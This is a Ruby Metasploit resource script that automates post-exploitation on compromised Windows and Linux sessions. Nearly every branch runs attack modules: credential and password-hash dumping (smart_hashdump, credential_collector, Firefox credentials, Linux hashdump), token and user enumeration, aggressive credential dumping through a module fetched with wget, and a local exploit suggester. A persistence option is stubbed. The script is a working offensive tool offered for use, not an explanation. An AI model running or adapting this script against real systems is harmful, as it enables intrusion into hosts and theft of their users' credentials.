<ruby>
   help = %Q|
    Description:
      Resource File to assiste in meterpreter post_exploitation tasks.
      This resouce script needs to be run outside meterpreter prompt and
      displays a list of commands based on host platform (windows/linux).
      This rc script querys db for session Id and run post-modules againts it.

    Execute in msfconsole:
       setg MSF_PATH <absoluct-path-to-metasploit>
       resource <path-to-script>/post_exploitation.rc

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>

   |
   print_line(help)
   Rex::sleep(2.0)


      user_input=''
      ## Sellect resource file menu based on target platform
      platform = framework.db.hosts.map(&:os_name).join(' ')
      if platform =~ /windows/i or platform =~ /Windows/i
      run_single("sessions")
        win = %Q|
  Command       Desciption                platform      
  -------       ----------                --------
  record        Record session activity   multi
  gather        Run post gather modules   Windows
  creds         Run credentials modules   Windows
  persistence   Persiste exe payload      Windows
  cve_suggest   Run exploit_suggester     multi
  exit          Exit post_exploitation    multi

      |
      print_line(win)
      Rex::sleep(0.5)
      print "[Command]: "
         user_input = gets.chomp

         ## Loop function to grab session ID
         framework.sessions.each do |query|
         sID = query.join(' ').first(1)
         run_single("setg SESSION #{sID}")
         end

         ## Function to record session activity
         if user_input == "record"
            print_status("Recording session activity.")
            rand = Rex::Text.rand_text_alpha(5)
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("unsetg all")
         ## Function to run multi gather modules
         elsif user_input == "gather"
            print_status("Running post gather modules.")
            Rex::sleep(1.0)
            run_single("use post/windows/gather/enum_logged_on_users")
            run_single("run")
            run_single("use post/windows/gather/enum_shares")
            run_single("run")
            run_single("use post/windows/gather/enum_applications")
            run_single("run")
            run_single("use post/windows/gather/enum_tokens")
            run_single("run")
            run_single("unsetg all")
         ## Function to run multi creds modules
         elsif user_input == "creds"
            print_status("Running post creds modules.")
            Rex::sleep(1.0)
            run_single("use post/windows/gather/credentials/windows_autologin")
            run_single("run")
            run_single("use post/windows/gather/credential_collector")
            run_single("run")
            run_single("use post/windows/gather/smart_hashdump")
            run_single("run")
            run_single("use post/multi/gather/firefox_creds")
            run_single("run")
            run_single("unsetg all")
         ## Function to upload exe and persiste it
         elsif user_input == "persistence"
            print_status("Persisting payload remotely")
            Rex::sleep(1.0)
            print_warning("--- Function under develop yet ---")
            run_single("unsetg all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            run_single("unsetg all")
         ## Function to exit 'windows' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end


      ## Sellect resource file menu based on target platform
      elsif platform =~ /linux/i or platform =~ /Linux/i
      run_single("sessions")
        lin = %Q|
  Command       Desciption                platform
  -------       ----------                --------
  record        Record session activity   multi
  gather        Run post gather modules   Linux
  creds         Run credentials modules   Linux
  cve_suggest   Run exploit_suggester     multi
  exit          Exit post_exploitation    multi

      |
      print_line(lin)
      Rex::sleep(2.0)
      print "[Command]: "
         user_input = gets.chomp

         ## loop function to grab session ID
         framework.sessions.each do |query|
         sID = query.join(' ').first(1)
         run_single("setg SESSION #{sID}")
         end

         ## Function to record session activity
         if user_input == "record"
            print_status("Recording session activity.")
            rand = Rex::Text.rand_text_alpha(5)
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("unsetg all")
         ## Function to run multi gather modules
         elsif user_input == "gather"
            Rex::sleep(1.0)
            run_single("use post/linux/gather/enum_system")
            run_single("run")
            run_single("use post/linux/gather/enum_network")
            run_single("run")
            run_single("use post/linux/gather/hashdump")
            run_single("run")
            run_single("unsetg all")
         ## Function to run multi creds modules
         elsif user_input == "creds"
            print_status("Running post creds modules.")
            Rex::sleep(1.0)

            ## Metasploit framework absoluct path setg variable declaration (user input?)
            if (framework.datastore['MSF_PATH'] == nil or framework.datastore['MSF_PATH'] == '')
               run_single("setg MSF_PATH /usr/share/metasploit-framework")
            end

            ## Make sure that linux_hostrecon.rb exists (msfdb)
            linux_recon = "#{framework.datastore['MSF_PATH']}/modules/post/linux/gather/linux_hostrecon.rb"
            unless (File.exist?(linux_recon))
               print_error("[ERROR] linux_hostrecon.rb not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)
               print_warning("[EXEC] sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/linux_hostrecon.rb")
               print_warning("[EXEC] path=$(locate modules/post/linux/gather | grep -v '\\doc' | grep -v '\\documentation' | head -n 1)")
               print_warning("[EXEC] sudo cp linux_hostrecon.rb $path/linux_hostrecon.rb")
               print_warning("[EXEC] sudo msfconsole -q -x 'db_status;reload_all'")
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               run_single("exit")
               return nil
          else
               print_good("linux_hostrecon.rb post-module found.")
               Rex::sleep(1.0)
          end
            run_single("use post/linux/gather/linux_hostrecon")
            run_single("set CREDENTIALS_DUMP true")
            run_single("set AGRESSIVE_DUMP true")
            run_single("run")
            run_single("unsetg all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            run_single("unsetg all")
         ## Function to exit 'linux' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end


      ## Resource script cant find any platform in database
      elsif platform.nil? or platform == '' or platform == ' '
      run_single("sessions")
         ## Target platform not supported - unknown?
         print_warning("target platform not supported: #{platform}")
         print_warning("Displaying only [multi] platform options.")
         Rex::sleep(1.0)
        multi = %Q|
  Command       Desciption                platform      
  -------       ----------                --------
  record        Record session activity   multi
  cve_suggest   Run exploit_suggester     multi
  exit          Exit post_exploitation    multi

      |
      print_line(multi)
      Rex::sleep(2.0)
      print "[Command]: "
         user_input = gets.chomp

         ## loop function to grab session ID
         framework.sessions.each do |query|
         sID = query.join(' ').first(1)
         run_single("setg SESSION #{sID}")
         end

         ## Function to record session activity
         if user_input == "record"
            print_status("Recording session activity.")
            rand = Rex::Text.rand_text_alpha(5)
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("unsetg all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            run_single("unsetg all")
         ## Function to exit 'multi' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end
      end

      ## Session logfile storaged
      if user_input == "record"
         print_warning("Session logfile: post_#{rand}.log")
      end

   ## Prompt:: msf >
   run_single("back")
</ruby>
